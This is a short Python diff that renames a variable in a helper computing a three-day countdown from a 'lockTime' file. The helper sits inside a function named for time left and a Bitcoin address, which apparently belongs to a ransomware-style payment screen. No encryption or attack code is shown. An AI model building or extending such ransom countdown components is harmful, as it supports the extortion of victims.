@@ -52,7 +52,7 @@ def homePage():
 
     def timeLeftAndBTCAddr():
         def __timeleftCal():
-            testPath,rmfolderPath = "./data/lock.json",f"C:/Users/{os.getlogin()}/AppData/Local/bkms/lock.json"
+            testPath,__rmfolderPath = "./data/lock.json",f"C:/Users/{os.getlogin()}/AppData/Local/bkms/lock.json"
             with open(testPath,"r") as file:
                 data = json.load(file)
             return datetime.datetime.strptime(data["lockTime"],"%Y-%m-%d %H:%M:%S") + datetime.timedelta(days=3) - datetime.datetime.now()
